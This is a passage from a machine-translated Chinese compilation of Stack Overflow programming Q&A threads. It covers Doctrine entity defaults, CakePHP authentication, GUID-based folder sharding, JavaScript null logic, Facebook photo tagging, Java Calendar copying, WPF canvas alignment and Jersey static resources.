     */
    private $group;

    public function setGroup(Group $group)
    {
        $this->group = $group;
        $group->addPerson($this);
    }

    // ... setters/getters

    //construct default Person
    public function __construct()
    {
        $this->setName("Mike");
        $this->setGroup($EXISTING_GROUP_FROM_MY_DB); // <<--------------
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T16:23:47.913

我同意moonwave99 认为这是糟糕的设计。在这里，您尝试从不支持容器的地方（即它不知道也不应该知道 Doctrine）访问数据库（通过 Doctrine 服务）。

我最近有一个类似的问题......实际上几乎完全相同的问题。但我不希望这个逻辑出现在控制器内部。所以我写了一个服务来处理用户的创建。我让该服务可以访问它唯一需要的其他服务：Doctrine。

这是一个示例，其中创建了具有所有可用角色的用户：

```
namespace MyBundle\Entity;

class UserFactory
{
    private $doctrine;

    public function __construct($doctrine)
    {
        $this->doctrine = $doctrine;
    }

    public function generateNewUser($email, $password)
    {
        $user = new User();

        // Since you have access to the Doctrine service, you can use $this->doctrine
        // to do anything you would normally do in your controller with $this->getDoctrine()
        $roles = $this->doctrine->getEntityManager()->getRepository("MyBundle:Role")->findAll();

        foreach ($roles as $role)
        {
            $user->addRole($role);
        }

        return $user;
    }
} 
```

`config.yml`现在在or中注册该服务`services.yml`，记住将 Doctrine 服务传递给它：

```
services:
    mybundle.factory.user:
        class: MyBundle\Entity\UserFactory
        arguments: ['@doctrine'] 
```

就是这样......现在，在您的控制器中，您可以通过执行以下操作创建一个新用户：

```
public function MyController()
{
    $user = $this->get("mybundle.factory.user")->generateNewUser("someone@email.com", "password123");
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-12-14T03:01:51.567

推荐的方法是要求构造函数参数中的关联实体对象，可选地与工厂（例如实体存储库）结合，以`Group`在实例化期间提供实体。这可确保实体始终处于有效状态。

*src/Entity/Person.php*

```
namespace App\Entity;

/**
 * @ORM\Entity(repositoryClass="App\Repository\PersonRepository")
 */
class Person 
{
   //...

    public function __construct($name, Group $group)
    {
         $this->setName($name);
         $this->setGroup($group);
    }

    //...
} 
```

*src/Repsotory/PersonRepository.php*

```
namespace App\Repsotory;

use App\Entity\Group;
use App\Entity\Person;

class PersonRepository
{
    const DEFAULT_GROUP = 122;

    public function create($name, Group $group = null)
    {
        if (null === $group) {
            $group = $this->_em->getReference(Group::class, self::DEFAULT_GROUP);
        }
        $person = new Person($name, $group);
        $this->_em->persist($person);

        return $person;
    }
} 
```

这允许您仅依靠 Doctrine ORM 实体管理器来维护默认的组关联。

```
$person = $em->getRepository(Person::class)->create('Mike');
$group = $person->getGroup();
echo $group->getId(); //outputs: 122
$em->flush(); 
```

这种方法可以在 Symfony 中扩展以使用查询服务而不是理论实体存储库，以提供处理实体实例化的中心位置。

> 在 Symfony 3.4+ 中，您可以使用[存储库服务](https://symfony.com/doc/4.4/doctrine.html#querying-for-objects-the-repository) 为存储库提供依赖注入，而不是使用`EntityManagerInterface`.

*src/Service/PersonCreateQuery.php*

```
namespace App\Service;

use App\Entity\Group;
use App\Entity\Person;
use Doctrine\ORM\EntityManagerInterface;

class PersonCreateQuery
{
    private $em;

    public function __construct(EntityManagerInterface $em)
    {
        $this->em = $em;
    }

    public function __invoke($name)
    {
        $group = $this->em->getReference(Group::class, 122);
        $person = new Person($name, $group);
        $this->em->persist($person);

        return $person;
    }
} 
```

现在您可以使用依赖注入来检索查询服务并根据需要使用它，例如使用 Symfony 表单或控制器。

```
namespace App\Controller;

use App\Service\PersonCreateQuery;

class PersonController
{
    public function createAction(PersonCreateQuery $query)
    {
        $person = $query('Mike');
        $this->getDoctrine()->getManager()->flush();

        //...
    } 
} 
```

> 注意： 的用法`$em->getReference()`可以替换为`$em->find()`。using`$em->getReference()`将阻止对数据库的查询，但如果引用无效，则会抛出异常，而 using`$em->find()`将返回`null`。

* * *

另一种方法是使用实​​体中的生命周期回调或事件侦听器来执行更复杂的功能。但是，这将导致您的实体被实例化为无效状态，直到它被持久化。

```
use Doctrine\ORM\Event\LifecycleEventArgs;
use Doctrine\ORM\Mapping as ORM;

/**
 * @ORM\Entity
 * @ORM\HasLifecycleCallbacks
 */
class Person 
{
     const DEFAULT_GROUP = 122;

     /** @ORM\Column(type="string") */
     private $name = 'Mike';

    /**
     * @ORM\ManyToOne(targetEntity="Group", inversedBy="persons")
     * @ORM\JoinColumn(referencedColumnName="id")
     */
    private $group;

    //....

    public function setGroup(Group $group)
    {
        $this->group = $group;
        $group->addPerson($this);
    }

    /**
     * @param LifecycleEventArgs $event
     * @ORM\PrePersist
     */
    public function onPrePersist(LifecycleEventArgs $event)
    {
       if (!$this->group instanceof Group) {
           /** set default group if not specified */
           $group = $event->getEntityManager()->getReference(Group::class,  self::DEFAULT_GROUP);
           $this->setGroup($group);
       }
    }

} 
```

现在，当您持久化一个 Person 实体时，如果它没有在其他地方显式设置，它将添加该组。

```
$person = new Person();
$person->setName('Foo Bar');
$em->persist($person); //persist or do nothing if already persisted

$group = $person->getGroup();
echo $group->getId(); //outputs: 122

$groupPerson = $group->getPerson();
echo $groupPerson->getName(); //outputs: Foo Bar
$em->flush(); //save to database 
```

为了理智，这里是教义事件文档的链接：

*   [教义 2 - 事件](http://doctrine-orm.readthedocs.org/projects/doctrine-orm/en/latest/reference/events.html)
*   [Doctrine 2 - 生命周期回调](http://doctrine-orm.readthedocs.org/projects/doctrine-orm/en/latest/reference/events.html#lifecycle-callbacks)
*   [Symfony - 学说生命周期回调](http://symfony.com/doc/current/doctrine/lifecycle_callbacks.html)

# cakephp - CakePHP：获取登录用户数据

> ID：13841929
> 
> 赞同：1
> 
> 时间：2012-12-12T14:32:54.077
> 
> 标签：cakephp, authentication, userinfo

**我做了什么**

我使用 Cookbook 的这一部分来创建我的身份验证： Link 完成后，我将字段更改为电子邮件和密码（在 AppController.php 中）：

```
public function beforeFilter() {
    $this->Auth->allow('index');
    $this->Auth->fields = array('username' => 'email', 'password' => 'password');
} 
```

**发生了什么**

登录表单总是说我的密码/电子邮件组合不正确。经过一段时间的搜索和尝试，我在 UsersController 的 login() 函数中的 Auth->login() 参数中添加了“$this->request->data”：

```
public function login(){
    $this->layout = 'login';
    if ($this->request->is('post')){
        if ($this->Auth->login($this->request->data)){
            $this->redirect($this->Auth->redirect());
        } else {
            $this->Session->setFlash(__('Ongeldig email adres of wachtwoord. Probeer het AUB opnieuw'));
        }
    }
} 
```

这有效，但现在我不能使用“$user['id']”来获取登录用户 ID。它说它不知道 $user 变量。

**我期望发生的事情**

首先，它应该在没有我添加参数的情况下让用户登录。其次，它应该打印了登录用户的 ID。

我希望有人可以帮助我解决这个问题。提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:56:59.397

字段现在在身份验证数组中：

```
 'authenticate' => array(
        'Form' => array(
            'fields' => array('username' => 'email', ...)
        )
    ) 
```

见 [http://book.cakephp.org/2.0/en/core-libraries/components/authentication.html#configuring-authentication-handlers](http://book.cakephp.org/2.0/en/core-libraries/components/authentication.html#configuring-authentication-handlers)

要么与

```
$this->Auth->authenticate = ... 
```

或者

```
public $components = array(
    'Auth' => array(
        'authenticate' => ...
    )
); 
```

但是，正如 PHP 自由职业者所说，这是有据可查的。

你用的是什么版本的食谱？2.x 的？

# file - 使用 GUID 作为文件夹名称 + 拆分

> ID：13841931
> 
> 赞同：5
> 
> 时间：2012-12-12T14:33:02.880
> 
> 标签：file, guid, uuid

我想使用 GUID (uuid) 来命名大型文件存储中的文件夹。每个存储项目都有自己的文件夹和 guid。最简单的方法是“x:\items\uuid\{uuid}...”
示例：“x:\items\uuid\F3B16318-4236-4E45-92B3-3C2C3F31D44F...”

我在这里看到一个问题。如果您期望获得至少 10.000 件物品，并且可能有 100.000 件或更多，然后是 100 万件，该怎么办。我不想将这么多项目（子文件夹）放在一个文件夹中。

我想通过拆分 guid 来解决这个问题。使用前 2 个字符在第一级创建子文件夹，然后使用接下来的 2 个字符并创建子文件夹。上面的例子是 --> "x:\items\uuid\F3\B1\6318-4236-4E45-92B3-3C2C3F31D44F..."

如果 guid 的前 4 个字符真的像预期的那样随机，那么我会在 256 个文件夹中得到 256 个文件夹，并且我总是在每个文件夹中得到合理数量的项目例如，如果你有 100 万个项目，那么你获取 --> 1 000 000 / 256 /256 = 每个文件夹 15.25 个项目

过去我已经测试过第一个字符的随机性。（通过 vb.net 应用程序）。结果：分布在文件夹中的项目均匀退出。也有人得出了同样的结论。请参阅[在 .NET 中创建的 Guid 的前四个字节分布有多均匀？](https://stackoverflow.com/questions/13149139/how-evenly-spread-are-the-first-four-bytes-of-a-guid-created-in-net)

**我想到的可能拆分**（以 100 万个项目为例） C1 = GUID 的字符 1，C2 = 字符 2 等

> *   C1\C2\Rest of GUID --> 16 * 16 * 3906 （几乎 4000 仍然是很多文件夹）
> *   C1\C2\C3\C4\Rest of Guid --> 16 * 16 * 16 * 16 * 15 （不必要的文件夹拆分）
> *   **C1C2\C3C4\Rest of Guid --> 256 * 256 * 15 （对我来说最好的选择？）**
> *   C1C2C3\Rest of Guid --> 4096 * 244（到第一级的许多文件夹？？）
> *   C1C2C3C4\Rest of Guid --> 65536 * 15（到第一级的许多文件夹！）

我的问题是：

*   有没有人看到这种实现的缺点。（方案：*C1C2\C3C4\Guid 的其余部分）
*   是否有一些拆分Guids的标准，或者这样做的一般方法。
*   如果您将几十万个子文件夹放在一个文件夹中会发生什么（如果可能，我仍然不喜欢使用任何拆分）

谢谢， 穆布利克

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T15:55:43.050

这与用于对其对象数据库进行分片的方法非常相似`git`（尽管使用 SHA1 哈希而不是 GUID...）。与任何算法一样，有利也有弊，但我认为在这种情况下没有任何明显的利弊会超过明确的利弊。计算目录结构有一点额外的 CPU 开销，但从长远来看，这个开销可能比重复搜索一百万个文件的单个目录所需的开销要少得多。

关于如何做到这一点，这在一定程度上取决于您用于生成 GUID 的库 - 您是否以字节数组（甚至是`struct`）格式获取它们，然后需要将其转换为字符表示以显示它，或者你把它们放在一个已经格式化的 ASCII 数组中？在第一种情况下，您需要提取适当的字节并自己格式化它们，在第二种情况下，您只需要提取一个子字符串。

至于将极端数量的子文件夹（甚至文件）放在一个文件夹中，确切的性能特征高度依赖于使用的实际文件系统。有些性能比其他性能好，但几乎所有目录的条目越多，性能就会显着下降。

# iphone - 模拟器 6.0 上的 IB z-order

> ID：13841935
> 
> 赞同：0
> 
> 时间：2012-12-12T14:33:17.423
> 
> 标签：iphone, xcode

![在此处输入图像描述](../Images/ae522e35d56d4e0f387125c49b7022b6.png)

考虑上面的 IB 对象列表。当在屏幕上呈现时，列表下方的兄弟姐妹应该位于更上方列出的兄弟姐妹之上。

在 Xcode 4.5.2 下，如果使用 iphone 模拟器 5.1 一切正常。但是对于模拟器 6.0，地图只涵盖了所有内容。如果使用实际设备（电话）进行测试，则相同。

希望有知识的人可以帮忙。

如果您没有（或确实）在模拟器 6.0 上发现此类问题，也请添加评论。问题可能与我的项目设置方式有关。

更新 ：

我自己用 iOS 6 地图视图设置了一个新的测试项目。z-order 似乎完全没有问题。所以问题可能与我的代码有关。不幸的是，已经写了很多，暂时没有足够的时间来回顾所有内容。我怀疑它与 rootViewController 属性有关。我的项目最初遵循一个较旧的方案，其中不使用 rootViewController ...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T08:35:17.710

通过调用Window的bringSubviewToFront方法解决了这个问题。但我相信只要有足够的时间，就能找到更好、更合适的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:38:47.273

我不知道这个订单是否可靠——在过去绝对不可靠，我也不相信今天是这样：D。（即使苹果声称它：D）

请参阅：[IPhone Interface Builder：Z-Index、按钮的 Z 顺序、图像、ui 元素等？](https://stackoverflow.com/questions/2276116/iphone-interface-builder-z-index-z-order-of-a-button-image-ui-element-etc) （目前第3个答案。7票）

# javascript - 禁用输入文本

> ID：13841939
> 
> 赞同：1
> 
> 时间：2012-12-12T14:33:26.157
> 
> 标签：javascript, jquery, css

出于某种原因，我想禁用输入文本，为此我使用此示例代码：

```
$('#id').attr('disabled', 'disabled'); 
```

有没有办法禁用输入文本而不使用输入文本的禁用属性，我的意思是例如使用 css 或其他方式？

事实上，我想要一个输入文本像一个禁用的文本而不改变它的属性？

最诚挚的问候。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:41:01.473

尝试：

```
<input id="myTxt" type="text" onfocus="this.blur()"/> 
```

或者通过 JS：

```
$('#myTxt').focus(function(){
    $(this).blur();
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T14:34:59.870

你不能通过 CSS 来做到这一点（除非你做了一些非常复杂的事情，比如隐藏输入并在其位置放置一个看起来禁用的矩形）。但是，这将禁用输入而不更改属性：

```
$("#id").prop('disabled', true); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:38:13.697

尝试这个

```
<input type="text" disabled="disabled" value="" /> 
```

# css - 停止 td 在相同宽度之上和之下制作其他 td

> ID：13841940
> 
> 赞同：1
> 
> 时间：2012-12-12T14:33:29.613
> 
> 标签：css, html-table

如何停止带有大量文本的 td，使其上方的 td 长度相同？

在此示例中，包含“1”的单元格的轮廓显示其与包含“此处的长文本”的单元格一样宽。我想要的是包含“1”的单元格的宽度仅与它包含的文本一样宽。

这可以用 CSS 完成吗？

[http://jsfiddle.net/r7yXD/1/](http://jsfiddle.net/r7yXD/1/)

```
<table>
 <tr> 
  <td>1</tRund>
  <td>2</td>
 </tr>
 <tr> 
  <td>long text here</td>
  <td>.</td>
 </tr>
</table>

td {
border: 1px solid red;
}​ 
```

所以看下面的图片，第一个例子是发生了什么，我明白为什么，但我可以用 CSS 来代替第二个选项吗？

​<img src="https://i.stack.imgur.com/lJoaJ.jpg" alt="在此处输入图片描述">

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:54:52.637

你不能。使 td 具有相同宽度的表格的性质。

但是，您可以添加额外的 td 和 use `colspan="2"`，但老实说，如果您需要做这样的事情，尤其是对于文本，您可能不应该使用表格。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:57:40.820

你有没有尝试过这样的事情

```
<style type="text/css">
td {
border: 1px solid red;
}​
</style>

<table>
 <tr> 
  <td>1</td>
  <td colspan="2">2</td>
 </tr>
 <tr> 
  <td colspan="2">long text here</td>
  <td>.</td>
 </tr>
</table> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T15:17:04.113

`<table>`如评论中所述，使用-element是不可能的。您可以在 w3.org 上阅读更多相关信息：“ [17.5 表格内容的可视化布局](http://www.w3.org/TR/CSS21/tables.html#table-layout)”。

它说：

> 这些框的视觉布局由矩形、不规则的行和列网格控制。每个框占用整数个网格单元，根据以下规则确定。

您的案例有趣的是第 5 条规则：

> […] 因此，每个单元格都是一个矩形框，一个或多个网格单元格宽高。[…]

# javascript - Javascript eval 是否正确评估包含空变量（即未知数）的三态布尔逻辑？

> ID：13841942
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:33:42.160
> 
> 标签：javascript, eval

我知道 Javascript 的 eval 可以评估表达式，例如

```
(true) && (false)
(true) || (false) 
 etc. 
```

但是，eval 的规范是否包括评估涉及未知数的语句，例如

```
(true) && (null)
(true) || (null)
(null) && (null)
(null) || (null)
 etc. 
```

我已经在代码中尝试过这个并看到它做到了，但这是预期的行为吗？Javascript eval 规范是这样说的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:46:13.280

> Javascript eval 是否正确评估三态布尔逻辑？

定义“正确”。Javascript 定义了行为。`Eval`在 Javascript 中，将字符串评估为 javascript 代码。SQL 也定义了行为。两者的行为不同。

在 javascript 中，`null`行为类似于`false`布尔表达式（是假的）。

`0`, `NaN`, `""`, `null`, `undefined`（当然还有`false`）都是假的。对象、非空字符串和非零数字（当然还有`true`）都是真实的。

`&&`返回第一个虚假参数（如果有）或最后一个参数（惰性 AND），并且不计算其余参数。`null && "anything"`是`null`。这可以用在像`console && console.log && console.log()`.

`||`返回第一个真实参数（如果有）或最后一个参数（惰性或），并且不评估其余参数。`null || "something"`是`"something"`。这可以用在像这样的语句中`var xhr = XmlHttpRequest || ItsReplacementInOlderBrowsers`

`!null`评估为`true`。`if(null) ...`评估`else`分支。这同样适用于任何虚假的事物。

从技术上讲，未定义的变量是`undefined`，不是`null`。不过，两者都是虚假的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:40:09.370

`null`不是“未知的”，当作为操作数放在比较中时，它只是被强制转换为布尔值 ( `false`)。有关更多信息，请参阅`null`此[“真实表”](http://jsfiddle.net/QjSYG/9/)中的行。

我不相信有任何行为的“规范” `eval`- 它所做的一切都采用 javascript 的字符串表示并在当前上下文中将其作为 javascript 执行。没有理由

```
eval('(true) && (null)'); 
```

会给你不同的结果

```
(true) && (null) 
```

此外，[eval 是邪恶的](https://stackoverflow.com/questions/86513/why-is-using-the-javascript-eval-function-a-bad-idea)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:38:17.850

null 的计算结果为 false，但请记住，还有更多涉及 null 的细节（例如：使用 ===）。

请查看此页面。它更详细地介绍了这一点： [http ://www.mapbender.org/JavaScript_pitfalls:_null,_false,_undefined,_NaN](http://www.mapbender.org/JavaScript_pitfalls:_null,_false,_undefined,_NaN)

# php - 使用 Facebook API 在提要对话框中标记某人

> ID：13841943
> 
> 赞同：8
> 
> 时间：2012-12-12T14:33:45.703
> 
> 标签：php, javascript, facebook, facebook-graph-api, facebook-javascript-sdk

我正在使用此代码在 Facebook 上分享图片。

```
<html xmlns="http://www.w3.org/1999/xhtml"
  xmlns:fb="https://www.facebook.com/2008/fbml">
  <head>
    <title>My Feed Dialog Page</title>
  </head>
  <body>
    <div id='fb-root'></div>
    <script src='http://connect.facebook.net/en_US/all.js'></script>
    <p><a onclick='postToFeed(); return false;'>Post to Feed</a></p>
    <p id='msg'></p>

    <script> 
      FB.init({appId: "13899290", status: true, cookie: true});

      function postToFeed() {

        // calling the API ...
        var obj = {
          method: 'feed',
          redirect_uri: 'YOUR URL HERE',
          link: 'https://developers.facebook.com/docs/reference/dialogs/',
          picture: 'http://fbrell.com/f8.jpg',
          name: 'Facebook Dialogs',
          caption: 'Reference Documentation',
          description: 'Using Dialogs to interact with users.'
        };

        function callback(response) {
          document.getElementById('msg').innerHTML = "Post ID: " + response['post_id'];
        }

        FB.ui(obj, callback);
      }

    </script>
  </body>
</html> 
```

我想标记照片上的人。我怎样才能做到这一点？

提前致谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-24T17:23:05.243

抱歉，您不能在提要对话框上标记人，而只能在“ **/photos ”中使用****标签**参数标记图片。

 ****[标记](https://developers.facebook.com/docs/technical-guides/opengraph/tagging/)**概念仅适用于 Open Graph 故事。

**更新：**

您只能使用有效的**地点**参数标记一个人（如果您想在帖子中隐藏地点，请提供任何有效的页面 ID），帖子看起来像 -

* * *

![在此处输入图像描述](../Images/5501b266cea727bc3e09064eeb9f1ba0.png)

我想，如果您不使用开放图，这是在帖子中标记朋友的唯一可能解决方案

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T22:14:37.627

FB.ui 方法`'feed'`相当于 POST 到`/USER_ID/feed`Graph API 端点，它会创建*帖子*。目前还没有办法使用 api为*帖子创建标签。*

参考：

[https://developers.facebook.com/bugs/247911678652789](https://developers.facebook.com/bugs/247911678652789)

[https://developers.facebook.com/docs/reference/api/post/](https://developers.facebook.com/docs/reference/api/post/)

或者，您可以将照片上传到相册（或 /me/photos）并为照片添加标签：

[https://developers.facebook.com/docs/reference/api/photo/](https://developers.facebook.com/docs/reference/api/photo/) [参见“标签：创建”部分]

这就是我获取用户上传的文件并使用标签发布它的方式：

```
// Upon successful file (photo) upload.
$FILEPATH = $_FILES['file']['tmp_name'];

// upload it to FB.
$args = array(
  'name' => 'Testing photo upload via php-SDK!',
  'source' => '@'.realpath($FILEPATH),
  'tags' => array(
    array('tag_uid' => USER_ID, 'x' => 20, 'y' => 40),
  )
);
$post_id = $facebook->api('/me/photos', 'post', $args); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-24T18:01:40.297

对于提要标记，请在此处查看我以前的答案[Facebook Graph API Post with_tags 选项](https://stackoverflow.com/questions/11614574/facebook-graph-api-post-with-tags-option/11614915#11614915)

总结一下，您基本上需要使用提及标记

[https://developers.facebook.com/docs/technical-guides/opengraph/mention-tagging/](https://developers.facebook.com/docs/technical-guides/opengraph/mention-tagging/)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-09-09T04:55:46.927

[在这里](https://developers.facebook.com/docs/graph-api/reference/v2.4/page/feed)找到这个：

> 例如，以下消息将内联提及 Facebook 开发人员页面：

```
Test message @[19292868552] tag 
```

但您的应用必须先经过审核。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-24T08:07:22.570

您不能将帖子中的图像标记到 NewsFeed (/home) 或用户的 Wall (/feed)。请参阅[Graph API 文档](https://developers.facebook.com/docs/reference/api/post/)以获取要供稿的帖子。没有与标签相关的参数。

> 我确定我最近在某个地方看到过这个

您看到的可能是照片上传，它们*确实*出现在提要中，但未被 API 归类为新闻提要的帖子。照片上传接受标签属性。请参阅[Photo](https://developers.facebook.com/docs/reference/api/photo/)的 Graph APi 文档。**

# json - 如何在 MongoDB 中获得彩色查询输出和 shell？

> ID：13841944
> 
> 赞同：25
> 
> 时间：2012-12-12T14:33:47.987
> 
> 标签：json, shell, mongodb, colors

能够使用彩色键和值查看输出真是太好了。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-12-12T14:33:47.987

查看我制作的名为 Mongo-Hacker 的 shell 扩展，它具有各种增强功能：

*   [Mongo 黑客网站](http://tylerbrock.github.com/mongo-hacker/)
*   [代码（GitHub）](http://www.github.com/tylerbrock/mongo-hacker/)

![彩色 MongoDB 外壳](../Images/3f53cfab974e4d81b9cdfe83ceedd223.png)

# java - 如何将 Calendar.add() 结果分配给新的 Calendar 对象（在 Java 7 中）？

> ID：13841949
> 
> 赞同：0
> 
> 时间：2012-12-12T14:34:07.823
> 
> 标签：java, date, calendar, clone

我想在日期上加一个月...

但我想在不更改原始日期的情况下将结果分配给一个新变量。我想以标准方式执行此操作，这似乎是使用 Calendar.add() 但该方法更改了用于计算的 Calendar 对象。

所以我想知道这里“正确”的做法是什么——我应该使用 Object.clone() 并转换回日历吗？本能地这似乎有点可怕和错误。或者，我应该使用如下语法从原始对象创建一个新的日历对象：

```
Calendar newCalendar = Calendar.getInstance();
newCalendar.setTime(originalCalendar.getTime()); 
```

看起来也很可怕......肯定有一个更简单的方法 - 请有人告诉我我错过了一些东西！

（......但请不要告诉我使用 Joda Time 或 Java 8 - 由于项目限制，我不能。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:36:39.563

日历不是一个漂亮的库，所以你不应该期望它是。

AFAIK，Java 8 将有一个基于 JodaTime 的新日期/时间库。;)

> 请不要告诉我使用 Joda Time - 由于项目限制，我不能

在这种情况下，只需学会享受使用日历及其怪癖。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-18T13:32:53.267

如果它可以帮助任何人或任何人有任何评论，这是我最终得到的代码：

```
/**
 * Get a new date/time by adding the specified number at the specified granularity
 * (day/weeks/months etc.) to a date/time.
 * @param dateTime
 *            Date/time to add to
 * @param field
 *            The calendar field representing granularity (day/weeks/months etc.)
 * @param amount
 *            Amount to be added
 * @return A new date/time from performing the calculation
 */
public static Calendar add(final Calendar dateTime, final int field, final int amount) {
    // Clone the date/time so the original one isn't changed
    Calendar newDateTime = Calendar.getInstance();
    Date dateTimeAsMillis = dateTime.getTime();
    newDateTime.setTime(dateTimeAsMillis);

    // Add the specified amount at the specified granularity
    newDateTime.add(field, amount);

    return newDateTime;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:39:06.727

出什么问题了

```
Calendar resultCalendar = originalCalendar.clone(); // Or any other way of creating a copy
resultCalendar.add(...); 
```

?

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T14:42:49.167

如果您不能使用 Joda-Time 并且仅限于标准日期/日历 API，那么我会建议以下内容：

```
Calendar calendar = Calendar.getInstance();
Date originalDate = calendar.getTime();

calendar.add(Calendar.MONTH, 1);
Date newDate = calendar.getTime();

calendar.setTime(originalDate); 
```

这将备份您当前的日期，然后使用日历计算当前日期 + 1 个月，然后将原始设置恢复到日历。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T14:46:17.907

如果你真的不想克隆一个新的日历对象，你可能会检索当月有多少天，然后计算需要跨度到下个月的时间。

这时候你可以 setTime(currentCalendar.getTime() + spanTime);

# python - Google App Engine 的有向/无向图库？

> ID：13841950
> 
> 赞同：2
> 
> 时间：2012-12-12T14:34:08.940
> 
> 标签：python, google-app-engine, app-engine-ndb, google-cloud-datastore

我正在开发另一个社交网络。不，我们不需要另一个——我只是为了更好地了解大型社会系统和数据库。我想使用 Python Google App Engine，我更喜欢 datastore/nosql 而不是 CloudSQL。在存储用户时，我希望将它们存储为无向图，以利用对这种结构的理解和算法。我可以通过每个节点/用户中的边缘/友谊列表轻松实现这一点，但我真正想要的是使用像 NetworkX 这样的库并利用他们一直在构建的东西。我可以开始使用 nx，但是随着图形的扩展，它不适合 memcache，需要某种持久存储。不会的

所以我需要一个支持无限大图的系统，其中只有一部分在 memcache 中用于应用程序引擎。它存在吗？

# wpf - 在 WPF 中对齐组件

> ID：13841952
> 
> 赞同：0
> 
> 时间：2012-12-12T14:34:10.820
> 
> 标签：wpf, vb.net, xaml

WPF 应用程序由任意大小的统一网格组成。网格中的每个单元格都包含一个画布。每个画布都是拖放操作的目标。

当我将另一个画布拖放到网格内的画布上时，我希望拖动的画布（源）和目标画布的左上角对齐，基本上将源放在目标的顶部。我正在寻找的行为是对齐网格效果。

目前，当我`element.GetValue(Canvas.LeftProperty)`在 NaN 中使用结果时。问题是确定网格内画布的角位置，但相对于整个窗口。我更喜欢使用网格，因为它会随着窗口大小自动调整大小。

即使网格大小发生变化，是否可以获取网格内画布的实际位置，或者指定要与网格内的另一个画布对齐的画布？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T13:40:30.950

这个问题是通过指定画布的顶部和左侧属性将每个画布绘制到另一个画布上来解决的，我不得不刮擦网格。我通过使用指定了每个画布的位置

```
Canvas.SetLeft(Me, position.X)
Canvas.SetTop(Me, position.Y) 
```

哪里`Me`是画布的一个实例。

现在很容易获得每个画布的 top 和 left 属性。现在唯一的问题是我必须手动调整每个画布的大小。

# jsp - 使用 Jersey 访问 REST 资源和静态资源

> ID：13841954
> 
> 赞同：11
> 
> 时间：2012-12-12T14:34:12.163
> 
> 标签：jsp, servlets, jersey, servlet-filters

我想使用 JSP 页面中的一些静态资源（图像、js、css）作为 Viewable

我不知道如何使用 WebPageContentRegex

如果我使用servlet，我可以执行资源，但我不能访问静态文件
如果我使用过滤器，我可以访问静态文件，但我不能执行资源

你能帮我访问这两个吗？

这是我的文件：

```
webapp
  |____ resources
  |       |____ css
  |       |____ images
  |       |____ js
  |
  |____ WEB-INF
          |____ jsp 
```

这是我的 web.xml 文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
     xmlns="http://java.sun.com/xml/ns/javaee" 
     xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
     xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
                         http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" id="WebApp_ID" version="2.5">

<display-name>test</display-name>

<servlet>
<servlet-name>REST</servlet-name>
<servlet-class>com.sun.jersey.spi.container.servlet.ServletContainer</servlet-class>
<init-param>
  <param-name>com.sun.jersey.config.property.packages</param-name>
  <param-value>my packages</param-value>
</init-param>
<init-param>
  <param-name>com.sun.jersey.spi.container.ContainerRequestFilters</param-name>
  <param-value>com.sun.jersey.api.container.filter.LoggingFilter</param-value>
</init-param>
<init-param>
  <param-name>com.sun.jersey.spi.container.ContainerResponseFilters</param-name>
  <param-value>com.sun.jersey.api.container.filter.LoggingFilter</param-value>
</init-param>
<init-param>
  <param-name>com.sun.jersey.config.property.JSPTemplatesBasePath</param-name>
  <param-value>/WEB-INF/jsp</param-value>
</init-param>
<init-param>
  <param-name>com.sun.jersey.config.property.WebPageContentRegex</param-name>
  <param-value>(/resources/(css|images|js)/.*)|(/WEB-INF/jsp/.*\.jsp)</param-value>
</init-param>
</servlet>
<servlet-mapping>
  <servlet-name>REST</servlet-name>
  <url-pattern>/resources/*</url-pattern>
</servlet-mapping>

</webapp> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-06-03T01:44:01.623

你能确认你在 jersey 1.x 吗？如果您使用的是 2.x，则应将 com.sun.jersey.config.property.WebPageContentRegex 替换为 jersey.config.servlet.filter.staticContentRegex

请问您也可以简化您的正则表达式，第一次只提供 *.html 吗？（可能是正则表达式的问题！）

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
                             http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
    id="WebApp_ID" version="2.5">

    <display-name>test</display-name>

    <servlet>
        <servlet-name>REST</servlet-name>
        <servlet-class>com.sun.jersey.spi.container.servlet.ServletContainer</servlet-class>
        <init-param>
